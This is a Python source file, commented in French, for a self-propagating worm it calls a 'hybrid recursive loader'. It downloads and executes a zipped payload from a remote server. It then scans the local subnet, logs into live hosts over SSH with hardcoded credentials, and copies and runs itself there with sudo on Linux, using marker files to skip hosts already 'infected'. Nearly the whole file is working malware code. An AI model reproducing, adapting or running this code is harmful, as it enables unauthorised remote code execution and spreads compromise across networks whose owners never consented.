import subprocess
import threading
import ipaddress
from queue import Queue, Empty
import time
import paramiko
import os
import platform
import sys
import requests
import zipfile

# =============================================================================
# ⚙️ CONFIGURATION GÉNÉRALE (SÉCURISÉE & RÉCURSIVE)
# =============================================================================
CONFIG = {
    # --- SECTION RÉSEAU (DISTRIBUTION) ---
    "NETWORK": "192.168.1.0/24", 
    "USERNAME": "labuser", 
    "PASSWORD": "password123", 
    "BLACKLIST": ["192.168.1.1", "192.168.1.10"], # IPs à ignorer
    
    # Marqueurs pour éviter les boucles infinies de propagation
    "MARKER_LINUX": "/tmp/.sys_updated",
    "MARKER_WIN": "C:/Users/Public/.sys_updated",

    # --- SECTION SERVEUR (LOADER) ---
    "SERVER_IP": "1.2.3.4",
    "SERVER_PORT": "8080",
    "FILE_NAME": "payload.zip",
    "EXEC_TARGET": "mon_script.py",  # Fichier à lancer après extraction
    "EXEC_TYPE": "python",           # "python" ou "direct"

    # --- PERFORMANCES ---
    "SCAN_THREADS": 30,
    "DEPLOY_THREADS": 5, # Bas pour ne pas crash le routeur
}
# =============================================================================

COLOR_RESET = "\033[0m"
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_CYAN = "\033[96m"
COLOR_BOLD = "\033[1m"

def print_banner():
    print(COLOR_CYAN + "=" * 65 + COLOR_RESET)
    print(COLOR_CYAN + COLOR_BOLD + "|    HYBRID RECURSIVE LOADER : DOWNLOADER & PROPAGATOR          |" + COLOR_RESET)
    print(COLOR_CYAN + COLOR_BOLD + "|             Système Autonome Multi-OS - Engineering           |" + COLOR_RESET)
    print(COLOR_CYAN + "=" * 65 + COLOR_RESET)

# -----------------------------------------------------------------------------
# PARTIE 1 : LE LOADER (TÉLÉCHARGEMENT ET EXÉCUTION)
# -----------------------------------------------------------------------------

def download_and_execute():
    """Télécharge le payload, l'extrait et l'exécute"""
    url = f"http://{CONFIG['SERVER_IP']}:{CONFIG['SERVER_PORT']}/{CONFIG['FILE_NAME']}"
    save_path = os.path.join(os.path.expanduser("~"), "Downloads", CONFIG["FILE_NAME"])
    extract_path = os.path.join(os.path.expanduser("~"), "Downloads", "payload")

    print(f"{COLOR_BLUE}[*] Tentative de téléchargement du payload...{COLOR_RESET}")
    try:
        response = requests.get(url, stream=True, timeout=10)
        response.raise_for_status()
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        with open(save_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk: f.write(chunk)
        print(f"{COLOR_GREEN}[+] Payload téléchargé : {save_path}{COLOR_RESET}")
    except Exception as e:
        print(f"{COLOR_RED}[-] Échec téléchargement : {e}{COLOR_RESET}")
        return False

    try:
        os.makedirs(extract_path, exist_ok=True)
        with zipfile.ZipFile(save_path, "r") as z:
            z.extractall(extract_path)
        print(f"{COLOR_GREEN}[+] Extraction réussie dans : {extract_path}{COLOR_RESET}")
    except Exception as e:
        print(f"{COLOR_RED}[-] Échec extraction : {e}{COLOR_RESET}")
        return False

    target_path = os.path.join(extract_path, CONFIG["EXEC_TARGET"])
    if not os.path.exists(target_path):
        print(f"{COLOR_RED}[-] Fichier cible introuvable : {target_path}{COLOR_RESET}")
        return False

    try:
        if CONFIG["EXEC_TYPE"] == "python":
            subprocess.Popen(["python3" if platform.system().lower() != "windows" else "python", target_path])
        elif CONFIG["EXEC_TYPE"] == "direct":
            if os.name != "nt": os.chmod(target_path, 0o755)
            subprocess.Popen([target_path])
        print(f"{COLOR_GREEN}[+] Payload exécuté avec succès.{COLOR_RESET}")
        return True
    except Exception as e:
        print(f"{COLOR_RED}[-] Erreur exécution : {e}{COLOR_RESET}")
        return False

# -----------------------------------------------------------------------------
# PARTIE 2 : LE DISTRIBUTEUR (SCAN ET PROPAGATION)
# -----------------------------------------------------------------------------

def is_blacklisted(ip):
    return ip in CONFIG["BLACKLIST"]

def ping_ip(ip_address, active_ips, lock):
    if is_blacklisted(str(ip_address)): return
    try:
        param = "-n" if platform.system().lower() == "windows" else "-c"
        result = subprocess.run(["ping", param, "1", "-w", "1000", str(ip_address)],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
        if result.returncode == 0:
            with lock:
                print(f"{COLOR_GREEN}[+] {str(ip_address):<15} ACTIVE{COLOR_RESET}")
                active_ips.append(str(ip_address))
    except Exception: pass

def worker(ip_queue, active_ips, lock):
    while True:
        try:
            ip = ip_queue.get_nowait()
        except Empty: break
        ping_ip(ip, active_ips, lock)
        ip_queue.task_done()

def deploy_recursive(ip):
    """Propage le script actuel sur la cible"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=CONFIG["USERNAME"], password=CONFIG["PASSWORD"], timeout=10)

        # Détection OS et Marqueur
        stdin, stdout, stderr = ssh.exec_command("uname")
        os_type = stdout.read().decode().strip()

        if "Linux" in os_type:
            target_dest = "/tmp/distributeur.py"
            marker = CONFIG["MARKER_LINUX"]
            cmd = f"sudo python3 {target_dest} &"
            os_label = "DEBIAN"
        else:
            stdin, stdout, stderr = ssh.exec_command("ver")
            if stdout.read():
                target_dest = "C:/Users/Public/distributeur.py"
                marker = CONFIG["MARKER_WIN"]
                cmd = f'start python "{target_dest}"'
                os_label = "WINDOWS"
            else:
                ssh.close()
                return

        # Anti-boucle
        check_marker = ssh.exec_command(f"ls {marker}")
        if check_marker.stdout.channel.recv_exit_status() == 0:
            print(f"{COLOR_YELLOW}[SKIP] {ip} déjà infectée.{COLOR_RESET}")
            ssh.close()
            return

        # Transfert du script lui-même (sys.argv[0])
        sftp = ssh.open_sftp()
        sftp.put(sys.argv[0], target_dest)
        sftp.close()

        # Création du marqueur
        if os_label == "DEBIAN": ssh.exec_command(f"sudo touch {marker}")
        else: ssh.exec_command(f'echo "done" > {marker}')

        # Lancement
        ssh.exec_command(cmd)
        print(f"{COLOR_GREEN}[SUCCESS] Propagé sur {ip} ({os_label}){COLOR_RESET}")
        ssh.close()
    except Exception as e:
        print(f"{COLOR_RED}[FAILED] Erreur sur {ip}: {str(e)}{COLOR_RESET}")

def main():
    print_banner()

    # 1. PROTECTION ANTI-BOUCLE LOCALE
    current_os = platform.system().lower()
    local_marker = CONFIG["MARKER_WIN"] if current_os == "windows" else CONFIG["MARKER_LINUX"]
    if os.path.exists(local_marker):
        print(f"{COLOR_RED}L'agent est déjà présent ici. Fin du cycle.{COLOR_RESET}")
        return
    try:
        with open(local_marker, "w") as f: f.write("done")
    except: pass

    # 2. PHASE LOADER (L'action immédiate sur la machine)
    print(f"{COLOR_YELLOW}🚀 Phase 1 : Exécution du Loader...{COLOR_RESET}")
    download_and_execute()

    # 3. PHASE DISTRIBUTION (La propagation récursive)
    print(f"\n{COLOR_BLUE}🔍 Phase 2 : Propagation au réseau {CONFIG['NETWORK']}...{COLOR_RESET}")
    try:
        network = ipaddress.ip_network(CONFIG["NETWORK"], strict=False)
        ips_to_scan = list(network.hosts()) if network.num_addresses > 2 else list(network)
    except ValueError as e:
        print(f"{COLOR_RED}Erreur réseau: {e}{COLOR_RESET}")
        return

    ip_queue = Queue()
    for ip in ips_to_scan: ip_queue.put(ip)

    active_ips = []
    lock = threading.Lock()
    
    scan_threads = []
    num_scan_threads = min(CONFIG["SCAN_THREADS"], len(ips_to_scan))
    for _ in range(num_scan_threads):
        t = threading.Thread(target=worker, args=(ip_queue, active_ips, lock))
        t.daemon = True
        t.start()
        scan_threads.append(t)

    ip_queue.join()

    # Déploiement récursif
    deploy_threads = []
    for ip in active_ips:
        t = threading.Thread(target=deploy_recursive, args=(ip,))
        t.start()
        deploy_threads.append(t)
        if len(deploy_threads) >= CONFIG["DEPLOY_THREADS"]:
            for dt in deploy_threads: dt.join()
            deploy_threads = []

    for t in deploy_threads: t.join()
    print(f"\n{COLOR_GREEN}🏁 Cycle terminé. Le payload a été distribué et lancé.{COLOR_RESET}")

if __name__ == "__main__":
    main()
